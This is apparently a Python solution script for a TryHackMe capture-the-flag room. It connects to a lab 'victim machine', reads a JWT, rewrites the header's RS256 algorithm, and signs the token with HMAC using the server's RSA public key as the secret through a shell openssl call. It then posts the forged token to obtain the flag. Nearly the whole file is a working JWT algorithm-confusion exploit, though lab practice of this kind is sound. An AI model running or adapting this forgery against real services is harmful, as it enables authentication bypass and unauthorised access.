#!/usr/bin/env python
# This script was built for TryHackMe Scripting room[Task 3] [Hard] Encrypted Server Chit Chat

# This script will connect to a socket, send a message, and set a few veriables.
# It will then recursivly send a new message(s) to test if the returned value is the desired flag and 
# the checksum matches

import os
import subprocess
import binascii
import hmac
import base64
import hashlib
import socket
import re
import binascii
import json
import OpenSSL


# Change HOST to the victim machine"
HOST="10.10.166.246"
PORT = 80
serverAddress = HOST, PORT

f = open("../TestFiles/public.pem",'r')
# print("public.pem: ", f.readline())
cert = f.read()
line = f.read().splitlines()
line = '\n'.join([str(x) for x in line])
# print("public.pem: ", line)
pem = bytes(line, encoding='utf8')

def toHex(lines):
	hexString = binascii.hexlify(lines)
	return hexString + bytes('0a', encoding='utf8')

def b64d(encoded):
	decoded = base64.b64decode(encoded)
	return decoded
def b64e(decoded):
	encoded = base64.b64encode(decoded)
	return encoded

try:
	print("trying to connect...")
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((HOST, int(PORT)))
	print("connected to TCP server", serverAddress)
	
	newPem = toHex(pem)

	s.settimeout(5)
	request = "GET / HTTP/1.0\r\nHost:"+HOST+"\r\n\r\n"
	s.send(request.encode('utf8'))

	response = s.recv(4096).decode()
	response = response.splitlines()
	# JWT = response[11].split(': ')
	JWT = response[11].split(': ')
	# print("datas:", JWT[1])
	
	head, payload, signature = JWT[1].split('.')
	decodedHead = b64d(head)
	# print("head: ", decodedHead.decode("UTF-8"))
	# print("payload: ", b64d(payload + "=="))
	# print("signature: ", str(decodedHead))
	newHeader = decodedHead.decode("UTF-8").replace("RS256", "SHA256")

	encodedHeader = b64e(bytes(newHeader, encoding='utf8')).decode("UTF-8")

	newPayload = str(encodedHeader).rstrip("=")+'.'+str(payload).rstrip("=")
	# print("newPayload: ", newPayload)
	# print("pem type: ", type(newPayload))



	bashCmdString = "echo -n {} | openssl dgst -sha256 -mac HMAC -macopt hexkey:2d2d2d2d2d424547494e205055424c4943204b45592d2d2d2d2d0a4d494942496a414e42676b71686b6947397730424151454641414f43415138414d49494243674b4341514541716938546e75514247584f47782f4c666e344a460a4e594f4832563171656d6673383373745763315a4251464351415a6d55722f736762507970597a7932323970466c3662476571706952487253756648756737630a314c4379616c795545502b4f7a65716245685353755573732f5879667a79624975736271494445514a2b5965783343646777432f68414633787074562f32742b0a48367930476468317765564b524d382b5161655755784d474f677a4a59416c55635241503564526b454f5574534b4842464f466845774e425872664c643736660a5a58504e67794e30547a4e4c516a50514f792f744a2f5646713843514745342f4b35456c5253446c6a346b7377786f6e575859415556786e71524e314c4748770a32473551524532443133734b484343385a725a584a7a6a36374872713568325341444b7a567a684138415733575a6c504c726c46543374312b695a366d2b61460a4b774944415141420a2d2d2d2d2d454e44205055424c4943204b45592d2d2d2d2d0a".format(newPayload)
	process = subprocess.Popen(bashCmdString, shell=True, stdout=subprocess.PIPE)
	subprocess_return = process.stdout.read()
	# print("output1:", subprocess_return)
	sig = subprocess_return.decode("UTF-8").split('= ')[1]
	# print("sig:", sig)
	
	HEXSig = bytes.fromhex(sig)
	# print("HEXSig:", HEXSig)
	
	b64Sig = str(base64.urlsafe_b64encode(HEXSig)).replace("=",'').strip("b\'")
	# print("b64Sig:", b64Sig)

	newJWT = "JWT%3a"+newPayload+'.'+b64Sig
	print("newJWT:", newJWT)
	
	req = '''POST /? HTTP/1.0\r\nHost: {}\r
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r
Accept-Encoding: gzip, deflate\r
Accept-Language: en-US,en;q=0.9\r
Cache-Control: max-age=0\r
Connection: keep-alive\r
Content-Length: 499\r
Content-Type: application/x-www-form-urlencoded\r
DNT: 1\r
Host: 10.10.166.246\r
Origin: http://10.10.166.246\r
Referer: http://10.10.166.246/?\r
Upgrade-Insecure-Requests: 1\r
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.3# \r
\r
jwt={}
'''
	# req = 'jwt = {}'
	req1 = req.format(HOST, newJWT)
	print(req1)
	s.send(req1.encode('utf8'))
		# s.send(request.encode('utf8'))

    #     s.settimeout(2)

	while True:
        # receive data stream. it won't accept data packet greater than 1024 bytes
		# response4 = s.recv(4096).decode()
		response4 = s.recv(1024).decode()
		if not response4:
            # if data is not received break
			print("no data")
			break
		print("from connected user: " + str(response4))
		response4 = input(' -> ')
	

	# print(" RRResponse:\r", response4)


	# s.send(newJWT.encode('utf8'))

	# response2 = s.recv(4096).decode()
	# # response2 = response2.splitlines()
	# print("response:",response2)
	




	s.close()
except socket.error as err:
	print(err)
	s.close()
